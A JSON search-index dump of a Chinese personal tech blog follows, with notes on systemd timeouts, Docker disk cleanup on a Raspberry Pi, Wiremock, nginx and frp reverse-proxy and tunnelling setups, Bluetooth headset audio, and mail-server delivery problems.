那麼允許的啟動時長將會在 TimeoutStartSec= 基礎上繼續延長指定的時長。 注意，必須在 TimeoutStartSec= 用完之前發出第一個延時信號。當啟動時間超出 TimeoutStartSec= 之後，該服務可以在維持始終不超時的前提下，不斷重複發送 “EXTEND_TIMEOUT_USEC=…” 信號， 直到完成啟動(發送 “READY=1” 信號)。詳見 sd_notify(3) 手冊。 TimeoutStopSec= 此選項有兩個用途： (1)設置每個 ExecStop= 的超時時長。如果其中之一超時， 那麼所有後繼的 ExecStop= 都會被取消，並且該服務也會被 SIGTERM 信號強制關閉。 如果該服務沒有設置 ExecStop= ，那麼該服務將會立即被 SIGTERM 信號強制關閉。 (2)設置該服務自身停止的超時時長。如果超時，那麼該服務將會立即被 SIGTERM 信號強制關閉(參見 systemd.kill(5) 手冊中的 KillMode= 選項)。 如果未指定時間單位，那麼將視為以秒為單位。 例如設為\"20\"等價於設為\"20s\"。 設為 “infinity” 則表示永不超時。 默認值等於 DefaultTimeoutStopSec= 的值(參見 systemd-system.conf(5) 手冊)。 如果一個 Type=notify 服務發送了 “EXTEND_TIMEOUT_USEC=…” 信號， 那麼允許的停止時長將會在 TimeoutStopSec= 基礎上繼續延長指定的時長。 注意，必須在 TimeoutStopSec= 用完之前發出第一個延時信號。當停止時間超出 TimeoutStopSec= 之後，該服務可以在維持始終不超時的前提下，不斷重複發送 “EXTEND_TIMEOUT_USEC=…” 信號，直到完成停止。 詳見 sd_notify(3) 手冊。 systemd.service 中文手冊 [金步國] ","date":"2020-12-07","objectID":"/blog/posts/Systemd-%E6%99%82%E9%96%93%E6%8E%92%E7%A8%8B%E7%AD%86%E8%A8%98/:7:5","tags":["systemd","crontab"],"title":"Systemd 時間排程筆記","uri":"/blog/posts/Systemd-%E6%99%82%E9%96%93%E6%8E%92%E7%A8%8B%E7%AD%86%E8%A8%98/"},{"categories":["Linux"],"content":"Supervisor Ubuntu下Supervisor安裝、配置和使用 | 程式前沿 日後看情況再研究 有看到 golang 版本 假如沒有權限可以考慮 但發現好像沒有 crontab 東西 不繼續研究了…. ","date":"2020-12-07","objectID":"/blog/posts/Systemd-%E6%99%82%E9%96%93%E6%8E%92%E7%A8%8B%E7%AD%86%E8%A8%98/:8:0","tags":["systemd","crontab"],"title":"Systemd 時間排程筆記","uri":"/blog/posts/Systemd-%E6%99%82%E9%96%93%E6%8E%92%E7%A8%8B%E7%AD%86%E8%A8%98/"},{"categories":["Linux"],"content":"總結 不專業總結 網路上有很多都寫得很詳細 建議看網路上詳細 本篇重點在筆記 網路上沒什麼看到 systemd 搭配 docker 裡面跑 感覺 supervisor 真的比較多 但我覺得排程這個東西有必要做虛擬化跑?這個也是個問題 用 crond 和 systemd 這個問題也是一個問題 目前我待過三家公司都是用 crond 居多 但用 crond 必須控制分散程式執行時間 有了 systemd ，工程師不用做複雜設計就可以使用 前提要會操作，所以進入門檻稍微高一點 不知道這些 systemd 有沒有辦法紀錄到 elk 上面 但我覺得這之後有空再研究 畢竟我還不會用XD ","date":"2020-12-07","objectID":"/blog/posts/Systemd-%E6%99%82%E9%96%93%E6%8E%92%E7%A8%8B%E7%AD%86%E8%A8%98/:9:0","tags":["systemd","crontab"],"title":"Systemd 時間排程筆記","uri":"/blog/posts/Systemd-%E6%99%82%E9%96%93%E6%8E%92%E7%A8%8B%E7%AD%86%E8%A8%98/"},{"categories":["Docker"],"content":"使用 Docker 我們知道rm container 所有東西不會被保留 但我往往會忽略有 images 占空間 我發現 PI 1 已經吃 14GB (總共空間 15GB) 後來發現是裝太多 images 原因是我往往先丟 PI 1 測試能不能跑 日積月累爆掉 PS: 是更新 apt upgrade 才發現 哈哈 ","date":"2020-11-25","objectID":"/blog/posts/Docker-%E4%BD%BF%E7%94%A8%E5%AE%B9%E9%87%8F%E6%92%90%E7%88%86-Raspberry-PI-%E7%A1%AC%E7%A2%9F%E7%A9%BA%E9%96%93/:0:0","tags":["docker"],"title":"Docker 使用容量撐爆 Raspberry PI 硬碟空間","uri":"/blog/posts/Docker-%E4%BD%BF%E7%94%A8%E5%AE%B9%E9%87%8F%E6%92%90%E7%88%86-Raspberry-PI-%E7%A1%AC%E7%A2%9F%E7%A9%BA%E9%96%93/"},{"categories":["Docker"],"content":"尋找所占目錄空間方法 參考: Linux - 找出佔用磁碟空間最大的目錄/檔案 du -hsx /home/* | sort -hr | head 這個好處能找到外面層所占目錄 可以慢慢跑裡面哪一個資料夾吃大空間 最後改成當下執行目錄前大空間大小 du -hsx ./* | sort -hr | head 找到 docker 其實 df 就能看到是 /lib/docker/overlay/… ","date":"2020-11-25","objectID":"/blog/posts/Docker-%E4%BD%BF%E7%94%A8%E5%AE%B9%E9%87%8F%E6%92%90%E7%88%86-Raspberry-PI-%E7%A1%AC%E7%A2%9F%E7%A9%BA%E9%96%93/:1:0","tags":["docker"],"title":"Docker 使用容量撐爆 Raspberry PI 硬碟空間","uri":"/blog/posts/Docker-%E4%BD%BF%E7%94%A8%E5%AE%B9%E9%87%8F%E6%92%90%E7%88%86-Raspberry-PI-%E7%A1%AC%E7%A2%9F%E7%A9%BA%E9%96%93/"},{"categories":["Docker"],"content":"docker 清除空間 以下參考整理 Docker:我們的硬盤空間去哪了？ - 知乎 Docker 空間使用分析與清理-阿里雲開發者社區 如何清理Docker占用的磁盘空间? | Fundebug博客 - 一行代码搞定BUG监控 - 网站错误监控|JS错误监控|资源加载错误|网络请求错误|小程序错误监控|Java异常监控|监控报警|Source Map|用户行为|可视化重现 ","date":"2020-11-25","objectID":"/blog/posts/Docker-%E4%BD%BF%E7%94%A8%E5%AE%B9%E9%87%8F%E6%92%90%E7%88%86-Raspberry-PI-%E7%A1%AC%E7%A2%9F%E7%A9%BA%E9%96%93/:2:0","tags":["docker"],"title":"Docker 使用容量撐爆 Raspberry PI 硬碟空間","uri":"/blog/posts/Docker-%E4%BD%BF%E7%94%A8%E5%AE%B9%E9%87%8F%E6%92%90%E7%88%86-Raspberry-PI-%E7%A1%AC%E7%A2%9F%E7%A9%BA%E9%96%93/"},{"categories":["Docker"],"content":"確認所占空間 docker system df Images 22 6 4.827GB 3.517GB (72%) Containers 6 4 93.54MB 8.661MB (9%) Local Volumes 3 1 214.6kB 66.34kB (30%) Build Cache 0 0 0B 0B # 詳細資訊 docker system df -v # 可以看更詳細資訊... ","date":"2020-11-25","objectID":"/blog/posts/Docker-%E4%BD%BF%E7%94%A8%E5%AE%B9%E9%87%8F%E6%92%90%E7%88%86-Raspberry-PI-%E7%A1%AC%E7%A2%9F%E7%A9%BA%E9%96%93/:2:1","tags":["docker"],"title":"Docker 使用容量撐爆 Raspberry PI 硬碟空間","uri":"/blog/posts/Docker-%E4%BD%BF%E7%94%A8%E5%AE%B9%E9%87%8F%E6%92%90%E7%88%86-Raspberry-PI-%E7%A1%AC%E7%A2%9F%E7%A9%BA%E9%96%93/"},{"categories":["Docker"],"content":"手動清除 # 刪除所有關閉的容器 docker ps -a | grep Exit | cut -d ' ' -f 1 | xargs docker rm # 刪除所有 dangling 鏡像(即無 tag 的鏡像)： docker rmi $(docker images | grep \"^\u003cnone\u003e\" | awk \"{print $3}\") # 刪除所有 dangling 數據卷(即無用的 volume)： docker volume rm $(docker volume ls -qf dangling=true) 這邊有更快清除方法 docker system prune Tips ： 不同狀態的鏡像 已使用鏡像（used image）： 指所有已被容器（包括已停止的）關聯的鏡像。即 docker ps -a 看到的所有容器使用的鏡像。 未引用鏡像（unreferenced image）：沒有被分配或使用在容器中的鏡像，但它有 Tag 信息。 懸空鏡像（dangling image）：未配置任何 Tag （也就無法被引用）的鏡像，所以懸空。這通常是由於鏡像 build 的時候沒有指定 -t 參數配置 Tag 導致的。比如: REPOSITORY TAG IMAGE ID CREATED SIZE \u003c none \u003e 6ad733544a63 5 days ago 1.13 MB \u003e # 懸空鏡像（dangling image） 掛起的卷（dangling Volume) 類似的，dangling=true 的 Volume 表示沒有被任何容器引用的卷。 docker system prune 自動清理說明： 該指令默認會清除所有如下資源： 已停止的容器（container） 未被任何容器所使用的卷（volume） 未被任何容器所關聯的網絡（network） 所有懸空鏡像（image）。 該指令默認只會清除懸空鏡像，未被使用的鏡像不會被刪除。 添加 -a 或 –all 參數後，可以一併清除所有未使用的鏡像和懸空鏡像。 可以添加 -f 或 –force 參數用以忽略相關告警確認信息。 指令結尾處會顯示總計清理釋放的空間大小。 以上指令沒有清除到空間，但加了 -a 就清除掉了 可以做 apt upgrade 了 docker system prune -a 有空再整理什麼是 懸空鏡像 東西… 跟 docker log 處理 ","date":"2020-11-25","objectID":"/blog/posts/Docker-%E4%BD%BF%E7%94%A8%E5%AE%B9%E9%87%8F%E6%92%90%E7%88%86-Raspberry-PI-%E7%A1%AC%E7%A2%9F%E7%A9%BA%E9%96%93/:2:2","tags":["docker"],"title":"Docker 使用容量撐爆 Raspberry PI 硬碟空間","uri":"/blog/posts/Docker-%E4%BD%BF%E7%94%A8%E5%AE%B9%E9%87%8F%E6%92%90%E7%88%86-Raspberry-PI-%E7%A1%AC%E7%A2%9F%E7%A9%BA%E9%96%93/"},{"categories":["實用軟體"],"content":"之前有使用vscode套件Rest Client搭配JSON-Server簡單使用小記 | 程式狂想筆記 但我覺得設定還不是很好用 有找到 Wiremock 他 router 跟 sample data json 是分開的 設定上我覺得非常快速 不會設定錯 git clone https://github.com/timmyBeef/mock-api.git 使用 Wiremock mock api (假造 api) - TimmyBeef’s Blog 備份圖 裡面介紹很清楚 看作者裡面內容吧 ","date":"2020-11-24","objectID":"/blog/posts/%E4%BD%BF%E7%94%A8-Wiremock-%E6%90%AD%E5%BB%BA-mockapi/:0:0","tags":["mockapi"],"title":"使用 Wiremock 搭建 mockapi","uri":"/blog/posts/%E4%BD%BF%E7%94%A8-Wiremock-%E6%90%AD%E5%BB%BA-mockapi/"},{"categories":["Linux"],"content":"之前有聽過 apache, nginx, frp, caddy server 都能做 web 反向代理 但都沒有實際工作用到 最近因為有搭建 mockapi 和 jboss 想對外測試line webhook 有想到代理對外窗口使用 ngrok 但…反向代理花了不少時間 希望下次複製及所用 這邊應該會以window 環境 畢竟公司開發環境是 window 之前有設定過 caddy server 1.0 反向代理非常好設定 但是從 caddy server 2.0 設定檔完全不會設定 然後 http =\u003e https 強制 相關都關不掉，找不到取消方法 只能乖乖用回其他工具 ","date":"2020-11-24","objectID":"/blog/posts/%E5%BF%AB%E9%80%9F%E6%90%AD%E5%BB%BA-web-%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86-server/:0:0","tags":["proxy"],"title":"快速搭建 web 反向代理 server","uri":"/blog/posts/%E5%BF%AB%E9%80%9F%E6%90%AD%E5%BB%BA-web-%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86-server/"},{"categories":["Linux"],"content":"nginx(方便好設定) ","date":"2020-11-24","objectID":"/blog/posts/%E5%BF%AB%E9%80%9F%E6%90%AD%E5%BB%BA-web-%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86-server/:1:0","tags":["proxy"],"title":"快速搭建 web 反向代理 server","uri":"/blog/posts/%E5%BF%AB%E9%80%9F%E6%90%AD%E5%BB%BA-web-%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86-server/"},{"categories":["Linux"],"content":"nginx (window) nginx 有 window 免安裝 zip # 啟動 nginx start nginx # 關閉 nginx ./nginx.exe -s stop ","date":"2020-11-24","objectID":"/blog/posts/%E5%BF%AB%E9%80%9F%E6%90%AD%E5%BB%BA-web-%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86-server/:1:1","tags":["proxy"],"title":"快速搭建 web 反向代理 server","uri":"/blog/posts/%E5%BF%AB%E9%80%9F%E6%90%AD%E5%BB%BA-web-%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86-server/"},{"categories":["Linux"],"content":"反向代理設定 server{ listen 80; # server_name 沒設定localhost 的話，只有 127.0.0.1 連的到 server_name localhost; location /mockapi/ { # 後端的 Web Server, 即真實伺服器: proxy_pass http://127.0.0.1:8081/; # 定義 header 變數, 記錄使用者的 IP proxy_set_header X-Real-IP $remote_addr; proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for; proxy_set_header X-Forwarded-Proto $http_x_forwarded_proto; proxy_max_temp_file_size 0; } location /web/ { # 後端的 Web Server, 即真實伺服器: proxy_pass http://127.0.0.1:8080/; # 定義 header 變數, 記錄使用者的 IP proxy_set_header X-Real-IP $remote_addr; proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for; proxy_set_header X-Forwarded-Proto $http_x_forwarded_proto; proxy_max_temp_file_size 0; } } 參考:Nginx代理proxy pass配置去除前缀 - Ryan.Miao - 博客园 ","date":"2020-11-24","objectID":"/blog/posts/%E5%BF%AB%E9%80%9F%E6%90%AD%E5%BB%BA-web-%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86-server/:1:2","tags":["proxy"],"title":"快速搭建 web 反向代理 server","uri":"/blog/posts/%E5%BF%AB%E9%80%9F%E6%90%AD%E5%BB%BA-web-%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86-server/"},{"categories":["Linux"],"content":"其他反向代理設定 location 要包在 server 裡面 /mockapi/ ==\u003e 127.0.0.1:8081 /web/ ==\u003e 127.0.0.1:8080 相對要連到 test.com/app/xxxxx =\u003e http://192.168.154.102/maped_dir/xxxxx location /app/ { proxy_pass http://192.168.154.102/maped_dir/; } 非常簡單 test.com/app/8081 =\u003e http://192.168.154.102:8081 location ~ ^/app/(.*)$ { proxy_pass http://192.169.154.102:$1; } test.com/app/request/xxxxx =\u003e http://192.168.154.102:9999/some_dir/xxxxx location ~ ^/app/(.*)$ { proxy_pass http://192.169.154.102:9999/some_dir/$1; } /app/hit/some/request/?name=xxxxx =\u003e http://192.168.154.102:9999/hit_page.php?path=some/request/\u0026name=xxxxx location /app/ { rewrite ^/app/hit/(.*)$ /hit_page.php?path=$1 break; proxy_pass http://192.168.154.102:9999/some_dir/; } 參考Nginx proxy_pass: examples for how does nginx proxy_pass map the request | Yet Another Summer Rain ","date":"2020-11-24","objectID":"/blog/posts/%E5%BF%AB%E9%80%9F%E6%90%AD%E5%BB%BA-web-%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86-server/:1:3","tags":["proxy"],"title":"快速搭建 web 反向代理 server","uri":"/blog/posts/%E5%BF%AB%E9%80%9F%E6%90%AD%E5%BB%BA-web-%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86-server/"},{"categories":["Linux"],"content":"frp 之前有有紀錄 frp 內網穿透使用筆記 | 程式狂想筆記 custom_domains、vhost_http_port 都需要設定 custom_domains 就設定 IP 就可以了 參考:七、利用frp 穿透到内网的http/https网站，实现对外开放 - 三度 - 博客园 ","date":"2020-11-24","objectID":"/blog/posts/%E5%BF%AB%E9%80%9F%E6%90%AD%E5%BB%BA-web-%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86-server/:2:0","tags":["proxy"],"title":"快速搭建 web 反向代理 server","uri":"/blog/posts/%E5%BF%AB%E9%80%9F%E6%90%AD%E5%BB%BA-web-%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86-server/"},{"categories":["Linux"],"content":"frps [common] bind_port = 7000 vhost_http_port = 80 ","date":"2020-11-24","objectID":"/blog/posts/%E5%BF%AB%E9%80%9F%E6%90%AD%E5%BB%BA-web-%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86-server/:2:1","tags":["proxy"],"title":"快速搭建 web 反向代理 server","uri":"/blog/posts/%E5%BF%AB%E9%80%9F%E6%90%AD%E5%BB%BA-web-%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86-server/"},{"categories":["Linux"],"content":"frpc [common] server_addr = 127.0.0.1 server_port = 7000 [web01] type = http local_port = 8080 custom_domains = 127.0.0.1 locations = /web [web02] type = http local_port = 8081 custom_domains = 127.0.0.1 locations = /mockapi ","date":"2020-11-24","objectID":"/blog/posts/%E5%BF%AB%E9%80%9F%E6%90%AD%E5%BB%BA-web-%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86-server/:2:2","tags":["proxy"],"title":"快速搭建 web 反向代理 server","uri":"/blog/posts/%E5%BF%AB%E9%80%9F%E6%90%AD%E5%BB%BA-web-%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86-server/"},{"categories":["Linux"],"content":"其他 caddy server traefik 在想看看有空研究 ","date":"2020-11-24","objectID":"/blog/posts/%E5%BF%AB%E9%80%9F%E6%90%AD%E5%BB%BA-web-%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86-server/:3:0","tags":["proxy"],"title":"快速搭建 web 反向代理 server","uri":"/blog/posts/%E5%BF%AB%E9%80%9F%E6%90%AD%E5%BB%BA-web-%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86-server/"},{"categories":["實用工具"],"content":"最近看 frp 文章 我看反向代理不用設定在 server 那邊 這邊方法有點跟 traefik 跟 label 實作有點像 但網路上說這兩個用途有點不太一樣 我認真看一下 frp 官網文件 真的還是有差!! frp 目前我看沒法跟 traefik 抓 docker label 去做自動代理動作 frp, traefik 都可以做 tcp, http 反向代理(聽說前幾版 traefik 不支援 tcp 代理) 這邊來看，traefik 功能實用信應該大於 frp 但看一下細節功能還是不一樣 frp 可以做 stcp(類似ssh tunnel) 連線，這邊 traefik 目前沒有這個東西 xtcp, unix socket …等等代理方法，這些 traefik 目前沒有這些 ","date":"2020-11-15","objectID":"/blog/posts/frp-%E5%85%A7%E7%B6%B2%E7%A9%BF%E9%80%8F%E4%BD%BF%E7%94%A8%E7%AD%86%E8%A8%98/:0:0","tags":["frp","traefik","ssh tunnel"],"title":"frp 內網穿透使用筆記","uri":"/blog/posts/frp-%E5%85%A7%E7%B6%B2%E7%A9%BF%E9%80%8F%E4%BD%BF%E7%94%A8%E7%AD%86%E8%A8%98/"},{"categories":["實用工具"],"content":"frp 環境建置 這邊我就簡單用 Vagrant 建置幾個 VM 環境 檢查大量不同 IP 跟 Port 方法 | 程式狂想筆記 這邊之前有寫過 這邊從這邊簡單複製過來改 Vagrant.configure(\"2\") do |config| config.vm.provision \"shell\", inline: \"echo Hello\" config.vm.define \"frp-server\" do |web| web.vm.box = \"ubuntu/xenial64\" web.vm.network \"private_network\", ip: \"192.168.50.2\" end config.vm.define \"frp-client1\" do |db| db.vm.box = \"ubuntu/xenial64\" db.vm.network \"private_network\", ip: \"192.168.50.4\" end # 其實我發現可以不用開很多 VM # 可以用 tmux 多開 frpc ，假如要模擬測試多台連，可以用這個 # config.vm.define \"frp-client2\" do |db| # db.vm.box = \"ubuntu/xenial64\" # db.vm.network \"private_network\", ip: \"192.168.50.5\" # end # config.vm.define \"frp-client3\" do |db| # db.vm.box = \"ubuntu/xenial64\" # db.vm.network \"private_network\", ip: \"192.168.50.6\" # end # config.vm.define \"frp-client4\" do |db| # db.vm.box = \"ubuntu/xenial64\" # db.vm.network \"private_network\", ip: \"192.168.50.3\" # end end vagrant up 會等機器開好 ","date":"2020-11-15","objectID":"/blog/posts/frp-%E5%85%A7%E7%B6%B2%E7%A9%BF%E9%80%8F%E4%BD%BF%E7%94%A8%E7%AD%86%E8%A8%98/:1:0","tags":["frp","traefik","ssh tunnel"],"title":"frp 內網穿透使用筆記","uri":"/blog/posts/frp-%E5%85%A7%E7%B6%B2%E7%A9%BF%E9%80%8F%E4%BD%BF%E7%94%A8%E7%AD%86%E8%A8%98/"},{"categories":["實用工具"],"content":"frp 安裝教學 參考:安装 frp 内网穿透工具 | 离线笔记 · OfflineNotes wget https://github.com/fatedier/frp/releases/download/v0.34.2/frp_0.34.2_linux_amd64.tar.gz tar xzvf frp_0.34.2_linux_amd64.tar.gz mv frp_0.34.2_linux_amd64 frp 這段看要不要在本機做或在 VM 做都可以 VM 記得要切到/vagrant 這邊做 這樣其他機器就不用再抓一次了 [common] bind_port = 7000 dashboard_addr = 0.0.0.0 # 正式不要開 dashboard_port = 7500 # 仪表盘访问的用户名密码，如果不设置，则默认都是 admin dashboard_user = admin dashboard_pwd = admin # auth token token = abcd1234567890 # VM frp-server 可以使用 tmux vagrant ssh frp-server cd /vagrant/frp ./frps -c frps.ini http://192.168.50.2:7500 有看到畫面就是成功了 ","date":"2020-11-15","objectID":"/blog/posts/frp-%E5%85%A7%E7%B6%B2%E7%A9%BF%E9%80%8F%E4%BD%BF%E7%94%A8%E7%AD%86%E8%A8%98/:2:0","tags":["frp","traefik","ssh tunnel"],"title":"frp 內網穿透使用筆記","uri":"/blog/posts/frp-%E5%85%A7%E7%B6%B2%E7%A9%BF%E9%80%8F%E4%BD%BF%E7%94%A8%E7%AD%86%E8%A8%98/"},{"categories":["實用工具"],"content":"port 轉發 ","date":"2020-11-15","objectID":"/blog/posts/frp-%E5%85%A7%E7%B6%B2%E7%A9%BF%E9%80%8F%E4%BD%BF%E7%94%A8%E7%AD%86%E8%A8%98/:3:0","tags":["frp","traefik","ssh tunnel"],"title":"frp 內網穿透使用筆記","uri":"/blog/posts/frp-%E5%85%A7%E7%B6%B2%E7%A9%BF%E9%80%8F%E4%BD%BF%E7%94%A8%E7%AD%86%E8%A8%98/"},{"categories":["實用工具"],"content":"client 設定 安裝 apache2 簡單做 # 進去client1 vagrant ssh frp-client1 # 安裝 apache2 sudo apt install apache2 curl localhost # 看到web內容就是完成了 cp frpc.ini frpc1.ini vim frpc1.ini [common] server_addr = 192.168.50.2 server_port = 7000 token = abcd1234567890 [web] type = tcp local_ip = 127.0.0.1 local_port = 80 remote_port = 8080 這邊沒用type= http ，因為 http 需要加custom_domains = 192.168.50.2樣子 http我好像會失敗，我先不用設定這麼麻煩 可以看一下利用FRP穿透到内网的http/https网站，实现对外开放 - 知乎 vhost_http_port也要設定 我就懶得測試了 ","date":"2020-11-15","objectID":"/blog/posts/frp-%E5%85%A7%E7%B6%B2%E7%A9%BF%E9%80%8F%E4%BD%BF%E7%94%A8%E7%AD%86%E8%A8%98/:3:1","tags":["frp","traefik","ssh tunnel"],"title":"frp 內網穿透使用筆記","uri":"/blog/posts/frp-%E5%85%A7%E7%B6%B2%E7%A9%BF%E9%80%8F%E4%BD%BF%E7%94%A8%E7%AD%86%E8%A8%98/"},{"categories":["實用工具"],"content":"hfs 之前進去 frpc 就懶得寫了 [common] server_addr = 192.168.50.2 server_port = 7000 token = abcd1234567890 [test_static_file] type = tcp remote_port = 8081 plugin = static_file # 要对外暴露的文件目录 plugin_local_path = /tmp # 用户访问 URL 中会被去除的前缀，保留的内容即为要访问的文件路径 plugin_strip_prefix = static plugin_http_user = abc plugin_http_passwd = abc http://192.168.50.2:8081/static/ 就可以進去了 其實仔細想想好像不需要太多 frp-client frpc可以同一台 server可以開很多… ","date":"2020-11-15","objectID":"/blog/posts/frp-%E5%85%A7%E7%B6%B2%E7%A9%BF%E9%80%8F%E4%BD%BF%E7%94%A8%E7%AD%86%E8%A8%98/:4:0","tags":["frp","traefik","ssh tunnel"],"title":"frp 內網穿透使用筆記","uri":"/blog/posts/frp-%E5%85%A7%E7%B6%B2%E7%A9%BF%E9%80%8F%E4%BD%BF%E7%94%A8%E7%AD%86%E8%A8%98/"},{"categories":["實用工具"],"content":"其他官網教學 为本地 HTTP 服务启用 HTTPS | frp 安全地暴露内网服务 | frp 点对点内网穿透 | frp 因為目前沒有要使用 本來想要寫 stcp 不過這個跟 ssh tunnel 差不多 之前有記錄這篇ssh port forward連MySQL方法(SSH Tunnel) | 程式狂想筆記 看上面教學還滿簡單了，這邊就不整理了 ","date":"2020-11-15","objectID":"/blog/posts/frp-%E5%85%A7%E7%B6%B2%E7%A9%BF%E9%80%8F%E4%BD%BF%E7%94%A8%E7%AD%86%E8%A8%98/:5:0","tags":["frp","traefik","ssh tunnel"],"title":"frp 內網穿透使用筆記","uri":"/blog/posts/frp-%E5%85%A7%E7%B6%B2%E7%A9%BF%E9%80%8F%E4%BD%BF%E7%94%A8%E7%AD%86%E8%A8%98/"},{"categories":["實用工具"],"content":"相關文章 MvsCode/frps-onekey: Frps 一键安装脚本\u0026管理脚本 A tool to auto-compile \u0026 install frps on Linux 免费frp公共服务器列表是什么？花生壳轻松实现ftp服务-oray贝锐科技花生壳官网 免费FRP内网穿透服务 “远程办公” 整体解决方案-内网穿透 - 知乎 ","date":"2020-11-15","objectID":"/blog/posts/frp-%E5%85%A7%E7%B6%B2%E7%A9%BF%E9%80%8F%E4%BD%BF%E7%94%A8%E7%AD%86%E8%A8%98/:6:0","tags":["frp","traefik","ssh tunnel"],"title":"frp 內網穿透使用筆記","uri":"/blog/posts/frp-%E5%85%A7%E7%B6%B2%E7%A9%BF%E9%80%8F%E4%BD%BF%E7%94%A8%E7%AD%86%E8%A8%98/"},{"categories":["電腦知識"],"content":"最近帶 SONY WH1000MX4 電腦聽音樂使用語音聊天 發現聲音沒有聽到音樂，後來發現聲音有兩個裝置 輸出 WH-1000XM4 Stereo WH-1000XM4 Hands-Free AG Audio 麥克風是 WH-1000XM4 Hands-Free AG Audio 簡單來說使用WH-1000XM4 Stereo不能使用麥克風…. 要全不聽到聲音跟別人聊天需要設定預設輸出WH-1000XM4 Hands-Free AG Audio 但缺點音樂品質不是很好 為什麼會這樣限制，好像跟藍芽傳輸頻寬有關係 通常我們使用手機耳機聽音樂，有人打電話來，音樂會暫停 但在 Windows 10 不會，不知道有什麼方法可以在 Window 10 切換? 看到有「預設通訊裝置」，但預設不會切換；耶不會關掉音樂 又看到官網介紹WH-1000XM4 | 說明指南 | 在電腦上進行視訊通話 網路上有用 powershell 指令切換 win10连接蓝牙耳机不能语音，是否有解决办法？ - 知乎 簡單來說只有這兩種選澤 WH-1000XM4 Hands-Free AG Audio,WH-1000XM4 Hands-Free AG Audio WH-1000XM4 Stereo 手動切換，好像無法自動切換麥克風(WH-1000XM4 Hands-Free AG Audio) ","date":"2020-11-12","objectID":"/blog/posts/%E9%9B%BB%E8%85%A6%E4%BD%BF%E7%94%A8%E8%97%8D%E8%8A%BD%E8%80%B3%E6%A9%9F%E6%99%82%E5%80%99%E4%B8%8D%E8%83%BD%E8%81%BD%E5%88%B0%E9%9B%BB%E8%85%A6%E9%9F%B3%E6%A8%82-%E6%88%96%E5%85%B6%E4%BB%96%E8%81%B2%E9%9F%B3/:0:0","tags":["藍芽"],"title":"電腦使用藍芽耳機時候不能聽到電腦音樂(或其他聲音)","uri":"/blog/posts/%E9%9B%BB%E8%85%A6%E4%BD%BF%E7%94%A8%E8%97%8D%E8%8A%BD%E8%80%B3%E6%A9%9F%E6%99%82%E5%80%99%E4%B8%8D%E8%83%BD%E8%81%BD%E5%88%B0%E9%9B%BB%E8%85%A6%E9%9F%B3%E6%A8%82-%E6%88%96%E5%85%B6%E4%BB%96%E8%81%B2%E9%9F%B3/"},{"categories":["Linux"],"content":"先蒐集，有空整理 ","date":"2020-10-28","objectID":"/blog/posts/%E7%A8%8B%E5%BC%8F%E7%99%BC%E4%BF%A1%E7%9A%84%E5%95%8F%E9%A1%8C%E6%95%B4%E7%90%86/:0:0","tags":["linux"],"title":"程式發信 mail 的問題整理","uri":"/blog/posts/%E7%A8%8B%E5%BC%8F%E7%99%BC%E4%BF%A1%E7%9A%84%E5%95%8F%E9%A1%8C%E6%95%B4%E7%90%86/"},{"categories":["Linux"],"content":"發信指令 16 Command Examples to Send Email From The Linux Command Line ","date":"2020-10-28","objectID":"/blog/posts/%E7%A8%8B%E5%BC%8F%E7%99%BC%E4%BF%A1%E7%9A%84%E5%95%8F%E9%A1%8C%E6%95%B4%E7%90%86/:1:0","tags":["linux"],"title":"程式發信 mail 的問題整理","uri":"/blog/posts/%E7%A8%8B%E5%BC%8F%E7%99%BC%E4%BF%A1%E7%9A%84%E5%95%8F%E9%A1%8C%E6%95%B4%E7%90%86/"},{"categories":["Linux"],"content":"relay access denied Postfix - Relay access denied - iT 邦幫忙::一起幫忙解決難題，拯救 IT 人的一天 postfix relay access denied – 阿喵就像家 Mail Server 設定對應 IP 就可以發信出去了 ","date":"2020-10-28","objectID":"/blog/posts/%E7%A8%8B%E5%BC%8F%E7%99%BC%E4%BF%A1%E7%9A%84%E5%95%8F%E9%A1%8C%E6%95%B4%E7%90%86/:2:0","tags":["linux"],"title":"程式發信 mail 的問題整理","uri":"/blog/posts/%E7%A8%8B%E5%BC%8F%E7%99%BC%E4%BF%A1%E7%9A%84%E5%95%8F%E9%A1%8C%E6%95%B4%E7%90%86/"},{"categories":["Linux"],"content":"黑名單 DNSBL Information - Spam Database Lookup Blocklist Removal Center - The Spamhaus Project ","date":"2020-10-28","objectID":"/blog/posts/%E7%A8%8B%E5%BC%8F%E7%99%BC%E4%BF%A1%E7%9A%84%E5%95%8F%E9%A1%8C%E6%95%B4%E7%90%86/:3:0","tags":["linux"],"title":"程式發信 mail 的問題整理","uri":"/blog/posts/%E7%A8%8B%E5%BC%8F%E7%99%BC%E4%BF%A1%E7%9A%84%E5%95%8F%E9%A1%8C%E6%95%B4%E7%90%86/"},{"categories":["Linux"],"content":"解決方案 更換 Mail Server 主機 IP (workaround?) DNS Server 設定MX 設定SPF 設定 DomainKey（DKIM） 設定 DMARC 開通25 Port ","date":"2020-10-28","objectID":"/blog/posts/%E7%A8%8B%E5%BC%8F%E7%99%BC%E4%BF%A1%E7%9A%84%E5%95%8F%E9%A1%8C%E6%95%B4%E7%90%86/:4:0","tags":["linux"],"title":"程式發信 mail 的問題整理","uri":"/blog/posts/%E7%A8%8B%E5%BC%8F%E7%99%BC%E4%BF%A1%E7%9A%84%E5%95%8F%E9%A1%8C%E6%95%B4%E7%90%86/"},{"categories":["Linux"],"content":"建製 mail 注意的事情 整理發信來源IP 調整DNS，A、PTR、MX、TXT record、DKIM 向各Email服務商提出申請 發信機主機名稱 LOG解析 